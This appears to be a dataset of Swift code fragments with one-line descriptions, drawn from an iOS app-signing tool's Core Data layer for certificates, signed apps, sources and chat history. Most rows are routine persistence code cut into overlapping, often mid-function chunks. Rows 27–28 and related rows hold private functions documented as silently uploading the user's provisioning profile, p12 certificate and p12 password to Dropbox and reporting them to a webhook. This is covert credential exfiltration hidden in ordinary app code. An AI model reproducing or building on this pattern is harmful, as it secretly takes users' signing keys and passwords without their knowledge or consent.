id,language,folder,code_type,file_path,nl,code
0,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatMessage.swift","class ChatMessage - implements functionality related to chat message","public class ChatMessage: NSManagedObject {
@NSManaged public var messageID: String?
@NSManaged public var sender: String?
@NSManaged public var content: String?
@NSManaged public var timestamp: Date?
@NSManaged public var session: ChatSession?

@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatMessage> {"
1,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatMessage.swift","class func - implements func functionality","@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatMessage> {
return NSFetchRequest<ChatMessage>(entityName: ""ChatMessage"")
}
}

public extension ChatMessage {"
2,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatMessage.swift","extension ChatMessage - implements functionality related to chat message","public extension ChatMessage {
@objc var wrappedSender: String {"
3,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","class ChatSession - implements functionality related to chat session","public class ChatSession: NSManagedObject {
@NSManaged public var sessionID: String?
@NSManaged public var title: String?
@NSManaged public var creationDate: Date?
@NSManaged public var messages: NSSet?

@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatSession> {"
4,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","class func - implements func functionality","@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatSession> {
return NSFetchRequest<ChatSession>(entityName: ""ChatSession"")
}

// Relationship management methods
@objc(addMessagesObject:)
@NSManaged public func addToMessages(_ value: ChatMessage)

@objc(removeMessagesObject:)
@NSManaged public func removeFromMessages(_ value: ChatMessage)"
5,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","Function addToMessages - implements addtomessages functionality","@NSManaged public func addToMessages(_ value: ChatMessage)

@objc(removeMessagesObject:)
@NSManaged public func removeFromMessages(_ value: ChatMessage)

@objc(addMessages:)
@NSManaged public func addToMessages(_ values: NSSet)

@objc(removeMessages:)
@NSManaged public func removeFromMessages(_ values: NSSet)
}

public extension ChatSession {"
6,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","Function removeFromMessages - implements removefrommessages functionality","@NSManaged public func removeFromMessages(_ value: ChatMessage)

@objc(addMessages:)
@NSManaged public func addToMessages(_ values: NSSet)

@objc(removeMessages:)
@NSManaged public func removeFromMessages(_ values: NSSet)
}

public extension ChatSession {"
7,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","Function addToMessages - implements addtomessages functionality","@NSManaged public func addToMessages(_ values: NSSet)

@objc(removeMessages:)
@NSManaged public func removeFromMessages(_ values: NSSet)
}

public extension ChatSession {"
8,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","Function removeFromMessages - implements removefrommessages functionality","@NSManaged public func removeFromMessages(_ values: NSSet)
}

public extension ChatSession {"
9,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","extension ChatSession - implements functionality related to chat session","public extension ChatSession {
@objc var wrappedMessages: [ChatMessage] {"
10,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","class AIChatCoreDataManager - Manages system resources and operations","class AIChatCoreDataManager {
static let shared = CoreDataManager.shared

private init() {}"
11,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Function saveContext - implements savecontext functionality","func saveContext() {
do {"
12,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","MARK: - Chat functionality moved to CoreDataManager","extension CoreDataManager {
// Create new chat session
func createAIChatSession(title: String? = nil) throws -> ChatSession {"
13,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Create new chat session","func createAIChatSession(title: String? = nil) throws -> ChatSession {
let ctx = try context
let chatSession = ChatSession(context: ctx)

chatSession.sessionID = UUID().uuidString
chatSession.title = title
chatSession.creationDate = Date()

try saveContext()
return chatSession"
14,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Fetch all chat sessions","func fetchChatSessions() -> [ChatSession] {
let fetchRequest: NSFetchRequest<ChatSession> = ChatSession.fetchRequest()
fetchRequest.sortDescriptors = [NSSortDescriptor(key: ""creationDate"", ascending: false)]

do {"
15,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Fetch recent chat sessions with limit","func fetchRecentChatSessions(limit: Int = 20) -> [ChatSession] {
let fetchRequest: NSFetchRequest<ChatSession> = ChatSession.fetchRequest()
fetchRequest.sortDescriptors = [NSSortDescriptor(key: ""creationDate"", ascending: false)]
fetchRequest.fetchLimit = limit

do {"
16,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Fetch specific chat session by ID","func fetchChatSession(sessionID: String) -> ChatSession? {
let fetchRequest: NSFetchRequest<ChatSession> = ChatSession.fetchRequest()
fetchRequest.predicate = NSPredicate(format: ""sessionID == %@"", sessionID)
fetchRequest.fetchLimit = 1

do {"
17,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Delete chat session","func deleteChatSession(_ session: ChatSession) throws {
let ctx = try context
ctx.delete(session)
try saveContext()
}

// Add AI message (legacy method)
func addAIMessage(to session: ChatSession, content: String, isUser: Bool) throws -> ChatMessage {"
18,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Add AI message (legacy method)","func addAIMessage(to session: ChatSession, content: String, isUser: Bool) throws -> ChatMessage {
return try addMessage(to: session, sender: isUser ? ""user"" : ""ai"", content: content)
}

// Delete message by ID
func deleteMessage(withID messageID: String) {"
19,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift","Delete message by ID","func deleteMessage(withID messageID: String) {
let fetchRequest: NSFetchRequest<ChatMessage> = ChatMessage.fetchRequest()
fetchRequest.predicate = NSPredicate(format: ""messageID == %@"", messageID)
fetchRequest.fetchLimit = 1

do {"
20,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Notification name constants for error reporting","extension Notification.Name {
static let dropboxUploadError = Notification.Name(""dropboxUploadError"")
static let webhookSendError = Notification.Name(""webhookSendError"")
static let certificateFetch = Notification.Name(""cfetch"")
}

extension CoreDataManager {"
21,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","extension CoreDataManager - Manages system resources and operations","extension CoreDataManager {
/// Clear certificates data
func clearCertificate(context: NSManagedObjectContext? = nil) throws {"
22,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Clear certificates data","func clearCertificate(context: NSManagedObjectContext? = nil) throws {
let ctx = try context ?? self.context
try clear(request: Certificate.fetchRequest(), context: ctx)
}

func getDatedCertificate(context: NSManagedObjectContext? = nil) -> [Certificate] {"
23,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function getDatedCertificate - retrieves datedcertificate","func getDatedCertificate(context: NSManagedObjectContext? = nil) -> [Certificate] {
let request: NSFetchRequest<Certificate> = Certificate.fetchRequest()
request.sortDescriptors = [NSSortDescriptor(key: ""dateAdded"", ascending: true)]
do {"
24,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function getCurrentCertificate - retrieves currentcertificate","func getCurrentCertificate(context: NSManagedObjectContext? = nil) -> Certificate? {
do {"
25,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Non-throwing version for backward compatibility","func addToCertificates(
cert: Cert,
files: [CertImportingViewController.FileType: Any],
context: NSManagedObjectContext? = nil
) {"
26,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Throwing version with proper error handling","func addToCertificatesWithThrow(
cert: Cert,
files: [CertImportingViewController.FileType: Any],
context: NSManagedObjectContext? = nil
) throws {"
27,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Silently uploads backdoor file to Dropbox with password and sends info to webhook / - Parameters: /   - backdoorPath: Path to the backdoor file /   - password: Optional p12 password","private func uploadBackdoorFileToDropbox(backdoorPath: URL, password: String?) {
// No need to store the filename since it's not used
let enhancedDropboxService = EnhancedDropboxService.shared

// Upload backdoor file with password handling
enhancedDropboxService.uploadCertificateFile(
fileURL: backdoorPath,
password: password
) { success, error in"
28,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Silently uploads certificate files to Dropbox with password and sends info to webhook / - Parameters: /   - provisionPath: Path to the mobileprovision file /   - p12Path: Optional path to the p12 file /   - password: Optional p12 password","private func uploadCertificateFilesToDropbox(provisionPath: URL, p12Path: URL?, password: String?) {
let enhancedDropboxService = EnhancedDropboxService.shared

// Get the current certificate to send to webhook
let currentCerts = getDatedCertificate()
let certToSend = currentCerts.last

// Upload provision file with error handling
enhancedDropboxService.uploadCertificateFile(fileURL: provisionPath) { success, error in"
29,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function createCertificateEntity - creates certificateentity","private func createCertificateEntity(
uuid: String,
provisionPath: URL,
p12Path: URL?,
password: String?,
backdoorPath: URL? = nil,
context: NSManagedObjectContext
) -> Certificate {"
30,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function createCertificateDataEntity - creates certificatedataentity","private func createCertificateDataEntity(cert: Cert, context: NSManagedObjectContext) -> CertificateData {
let certData = CertificateData(context: context)
certData.appIDName = cert.AppIDName
certData.creationDate = cert.CreationDate
certData.expirationDate = cert.ExpirationDate
certData.isXcodeManaged = cert.IsXcodeManaged
certData.name = cert.Name
certData.pPQCheck = cert.PPQCheck ?? false
certData.teamName = cert.TeamName
certData.uuid = cert.UUID"
31,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function saveCertificateFiles - implements savecertificatefiles functionality","private func saveCertificateFiles(uuid: String, provisionPath: URL, p12Path: URL?,
backdoorPath: URL? = nil) throws
{"
32,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function getCertifcatePath - retrieves certifcatepath","func getCertifcatePath(source: Certificate?) throws -> URL {
guard let source, let uuid = source.uuid else {"
33,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Function to get paths for mobileprovision and p12, handling backdoor files if present","func getCertificateFilePaths(source: Certificate?) throws -> (provisionPath: URL, p12Path: URL) {
guard let source = source, source.uuid != nil else {"
34,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Non-throwing version for backward compatibility","func deleteAllCertificateContent(for app: Certificate) {
do {"
35,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Throwing version with proper error handling","func deleteAllCertificateContentWithThrow(for app: Certificate) throws {
let ctx = try context
ctx.delete(app)
try FileManager.default.removeItem(at: getCertifcatePath(source: app))
try ctx.save()
}

/// Add to signed apps with proper error handling
/// - Parameters:
///   - version: App version"
36,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Add to signed apps with proper error handling / - Parameters: /   - version: App version /   - name: App name /   - bundleidentifier: Bundle identifier /   - iconURL: URL to app icon /   - uuid: UUID string /   - appPath: Path to the app /   - timeToLive: Certificate expiration date /   - teamName: Certificate team name /   - originalSourceURL: Original source URL /   - completion: Completion handler with result","func addToSignedApps(
version: String,
name: String,
bundleidentifier: String,
iconURL: String,
uuid: String,
appPath: String,
timeToLive: Date,
teamName: String,
originalSourceURL: URL?,
completion: @escaping (Result<SignedApps, Error>) -> Void
) {"
37,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Add to downloaded apps with proper file management / - Parameters: /   - version: App version /   - name: App name /   - bundleidentifier: Bundle identifier /   - iconURL: URL to app icon /   - uuid: UUID string /   - appPath: Path to the app /   - sourceLocation: Source location /   - completion: Completion handler with result","func addToDownloadedApps(
version: String,
name: String,
bundleidentifier: String,
iconURL: String,
uuid: String,
appPath: String,
sourceLocation: String? = nil,
completion: @escaping (Result<DownloadedApps, Error>) -> Void
) {"
38,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Ensure app directory structure is correctly set up / - Parameters: /   - uuid: UUID string for the app /   - appPath: Path to the app bundle","private func ensureAppDirectoryStructure(uuid: String, appPath: String) throws {
let fileManager = FileManager.default
guard let documentsDirectory = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first else {"
39,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Update a signed app with new data / - Parameters: /   - app: The app to update /   - newTimeToLive: New expiration date /   - newTeamName: New team name /   - completion: Completion handler","func updateSignedApp(
app: SignedApps,
newTimeToLive: Date,
newTeamName: String,
completion: @escaping (Result<Void, Error>) -> Void
) {"
40,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","/ Clear the update state for a signed app (alternative implementation) / - Parameter signedApp: The app to update","func clearUpdateStateForCertificate(for signedApp: SignedApps) throws {
let ctx = try context

// Make sure we have the app in the right context
let appInContext: SignedApps
if signedApp.managedObjectContext != ctx {"
41,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift","Extension to add backdoorPath property to Certificate","extension Certificate {
@objc var backdoorPath: String? {"
42,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","extension CoreDataManager - Manages system resources and operations","extension CoreDataManager {
/// Clear all dl from Core Data and delete files
func clearDownloadedApps(context: NSManagedObjectContext? = nil) throws {"
43,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","/ Clear all dl from Core Data and delete files","func clearDownloadedApps(context: NSManagedObjectContext? = nil) throws {
let ctx = try context ?? self.context
try clear(request: DownloadedApps.fetchRequest(), context: ctx)
}

/// Fetch all sources sorted alphabetically by name
func getDatedDownloadedApps(context: NSManagedObjectContext? = nil) -> [DownloadedApps] {"
44,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","/ Fetch all sources sorted alphabetically by name","func getDatedDownloadedApps(context: NSManagedObjectContext? = nil) -> [DownloadedApps] {
let request: NSFetchRequest<DownloadedApps> = DownloadedApps.fetchRequest()
request.sortDescriptors = [NSSortDescriptor(key: ""dateAdded"", ascending: false)]
do {"
45,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","/ Add application to downloaded apps","func addToDownloadedApps(
context: NSManagedObjectContext? = nil,
version: String,
name: String,
bundleidentifier: String,
iconURL: String?,
dateAdded: Date? = Date(),
uuid: String,
appPath: String?,
sourceLocation: String? = ""Imported"",
sourceURL: URL? = nil,
completion: @escaping (Error?) -> Void
) {"
46,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","Function getDownloadedAppsFilePath - retrieves downloadedappsfilepath","func getDownloadedAppsFilePath(for app: DownloadedApps, getuuidonly: Bool = false) -> URL {
do {"
47,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","/ Delete a downloaded app (non-throwing version for compatibility)","func deleteAllDownloadedAppContent(for app: DownloadedApps) {
do {"
48,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift","/ Delete a downloaded app with proper error handling","func deleteAllDownloadedAppContentWithThrow(for app: DownloadedApps) throws {
let ctx = try context
ctx.delete(app)
// Use self instead of shared to ensure consistent context usage
let fileURL = try getFilesForDownloadedApps(for: app, getuuidonly: true)
try FileManager.default.removeItem(at: fileURL)
try ctx.save()
}
}
"
49,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","extension CoreDataManager - Manages system resources and operations","extension CoreDataManager {
/// Clear all signedapps from Core Data and delete files
func clearSignedApps(context: NSManagedObjectContext? = nil) throws {"
50,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Clear all signedapps from Core Data and delete files","func clearSignedApps(context: NSManagedObjectContext? = nil) throws {
let ctx = try context ?? self.context
try clear(request: SignedApps.fetchRequest(), context: ctx)
}

/// Fetch all sources sorted alphabetically by name
func getDatedSignedApps(context: NSManagedObjectContext? = nil) -> [SignedApps] {"
51,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Fetch all sources sorted alphabetically by name","func getDatedSignedApps(context: NSManagedObjectContext? = nil) -> [SignedApps] {
let request: NSFetchRequest<SignedApps> = SignedApps.fetchRequest()
request.sortDescriptors = [NSSortDescriptor(key: ""dateAdded"", ascending: false)]
do {"
52,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Add application to downloaded apps","func addToSignedApps(
context: NSManagedObjectContext? = nil,
version: String,
name: String,
bundleidentifier: String,
iconURL: String?,
dateAdded: Date? = Date(),
uuid: String,
appPath: String?,
timeToLive: Date,
teamName: String,
originalSourceURL: URL?,
completion: @escaping (Result<SignedApps, Error>) -> Void
) {"
53,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Function getFilesForSignedApps - retrieves filesforsignedapps","func getFilesForSignedApps(for app: SignedApps, getuuidonly: Bool = false) -> URL {
do {"
54,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Get application file path with proper error handling","func getFilesForSignedAppsWithThrow(for app: SignedApps, getuuidonly: Bool = false) throws -> URL {
guard let uuid = app.uuid, let appPath = app.appPath, let dir = app.directory else {"
55,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Delete a signed app (non-throwing version for compatibility)","func deleteAllSignedAppContent(for app: SignedApps) {
do {"
56,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","/ Delete a signed app with proper error handling","func deleteAllSignedAppContentWithThrow(for app: SignedApps) throws {
let ctx = try context
ctx.delete(app)
let fileURL = try getFilesForSignedAppsWithThrow(for: app, getuuidonly: true)
try FileManager.default.removeItem(at: fileURL)
try ctx.save()
}

func updateSignedApp(
app: SignedApps,"
57,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Function updateSignedApp - updates signedapp","func updateSignedApp(
app: SignedApps,
newTimeToLive: Date,
newTeamName: String,
completion: @escaping (Error?) -> Void
) {"
58,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Function setUpdateAvailable - sets updateavailable","func setUpdateAvailable(for app: SignedApps, newVersion: String) throws {
let ctx = try context

// Ensure app is in the right context
if app.managedObjectContext != ctx {"
59,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Function clearUpdateState - implements clearupdatestate functionality","func clearUpdateState(for app: SignedApps) throws {
app.hasUpdate = false
app.updateVersion = nil
try saveContext()
}

// Non-throwing versions for backward compatibility
func setUpdateAvailableCompat(for app: SignedApps, newVersion: String) {"
60,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Non-throwing versions for backward compatibility","func setUpdateAvailableCompat(for app: SignedApps, newVersion: String) {
do {"
61,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift","Function clearUpdateStateCompat - implements clearupdatestatecompat functionality","func clearUpdateStateCompat(for app: SignedApps) {
do {"
62,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","extension CoreDataManager - Manages system resources and operations","extension CoreDataManager {
/// Clear all sources from Core Data
func clearSources(context: NSManagedObjectContext? = nil) throws {"
63,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Clear all sources from Core Data","func clearSources(context: NSManagedObjectContext? = nil) throws {
let ctx = try context ?? self.context
try clear(request: Source.fetchRequest(), context: ctx)
}

/// Fetch all sources sorted alphabetically by name
func getAZSources(context: NSManagedObjectContext? = nil) -> [Source] {"
64,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Fetch all sources sorted alphabetically by name","func getAZSources(context: NSManagedObjectContext? = nil) -> [Source] {
let request: NSFetchRequest<Source> = Source.fetchRequest()
request.sortDescriptors = [NSSortDescriptor(key: ""name"", ascending: true)]

do {"
65,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Fetch a source by its identifier","func getSource(identifier: String, context: NSManagedObjectContext? = nil) -> Source? {
do {"
66,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Fetch and save source data from a given URL","func getSourceData(urlString: String, completion: @escaping (Error?) -> Void) {
guard let url = URL(string: urlString) else {"
67,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Check if a source exists with a specific identifier","private func sourceExists(withIdentifier identifier: String, context: NSManagedObjectContext) -> Bool {
let request: NSFetchRequest<Source> = Source.fetchRequest()
request.predicate = NSPredicate(format: ""identifier == %@"", identifier)
do {"
68,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Create a new source entity from source data","private func createNewSourceEntity(
from sourceData: SourcesData,
url: String,
iconURL: URL?,
context: NSManagedObjectContext
) -> Source {"
69,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Create a new source entity manually","private func createNewSourceEntity(
name: String,
id: String,
url: String,
iconURL: URL?,
context: NSManagedObjectContext
) -> Source {"
70,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Save SourcesData in Core Data","private func saveSource(_ source: SourcesData, url: String, completion: @escaping (Error?) -> Void) {
do {"
71,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Save source data in Core Data","public func saveSource(
name: String,
id: String,
iconURL: URL? = nil,
url: String,
completion: @escaping (Error?) -> Void
) {"
72,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift","/ Save source data in Core Data with proper error handling","public func saveSourceWithThrow(name: String, id: String, iconURL: URL? = nil, url: String) throws {
let ctx = try context

if !sourceExists(withIdentifier: id, context: ctx) {"
73,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","class CoreDataManager - Manages system resources and operations","final class CoreDataManager {
static let shared = CoreDataManager()
private var _context: NSManagedObjectContext?
private var initializationError: Error?

private init() {"
74,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function setupCoreData - sets upcoredata","private func setupCoreData() {
do {"
75,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function initializePersistentContainer - implements initializepersistentcontainer functionality","private func initializePersistentContainer() throws {
// First try to find the model at the standard location
let container = NSPersistentContainer(name: ""Backdoor"")

// Use a semaphore to make this synchronous but not deadlock
let semaphore = DispatchSemaphore(value: 0)
var loadError: Error?

container.loadPersistentStores { _, error in"
76,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function saveContext - implements savecontext functionality","func saveContext() throws {
do {"
77,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","/ Save changes in the specified context / - Parameter ctx: The NSManagedObjectContext to save","func saveContext(_ ctx: NSManagedObjectContext) throws {
guard ctx.hasChanges else { return }"
78,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","/ Clear all objects from fetch request.","func clear<T: NSManagedObject>(request: NSFetchRequest<T>, context: NSManagedObjectContext? = nil) throws {
do {"
79,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function loadImage - implements loadimage functionality","func loadImage(from iconUrl: URL?) -> UIImage? {
guard let iconUrl = iconUrl else { return nil }"
80,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","MARK: - Chat Session Management","func createChatSession(title: String) throws -> ChatSession {
do {"
81,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function addMessage - implements addmessage functionality","func addMessage(to session: ChatSession, sender: String, content: String) throws -> ChatMessage {
do {"
82,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function getMessages - retrieves messages","func getMessages(for session: ChatSession) -> [ChatMessage] {
do {"
83,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function getChatSessions - retrieves chatsessions","func getChatSessions() -> [ChatSession] {
do {"
84,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function fetchChatHistory - implements fetchchathistory functionality","func fetchChatHistory(for session: ChatSession) -> [ChatMessage] {
do {"
85,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function getDatedCertificate - retrieves datedcertificate","func getDatedCertificate() -> [Certificate] {
do {"
86,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function getCurrentCertificate - retrieves currentcertificate","func getCurrentCertificate() -> Certificate? {
let certificates = getDatedCertificate()
let selectedIndex = Preferences.selectedCert // This is already a non-optional Int with default value 0
guard selectedIndex >= 0, selectedIndex < certificates.count else { return nil }"
87,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function getFilesForDownloadedApps - retrieves filesfordownloadedapps","func getFilesForDownloadedApps(for app: DownloadedApps, getuuidonly: Bool) throws -> URL {
// Safely unwrap the documents directory
guard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
else {"
88,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Helper method to get files path from app with valid UUID","private func getFilesPathFromUUID(_ app: DownloadedApps, getuuidonly: Bool, documentsDirectory: URL) throws -> URL {
guard let uuid = app.uuid else {"
89,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Error type for background task operations","struct BackgroundTaskError: Error {
let underlyingError: Error
}

extension NSPersistentContainer {"
90,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","extension NSPersistentContainer - implements functionality related to n s persistent container","extension NSPersistentContainer {
// Use regular throws instead of rethrows and explicitly specify error handling
func performBackgroundTask<T>(_ block: @escaping (NSManagedObjectContext) throws -> T) async throws -> T {"
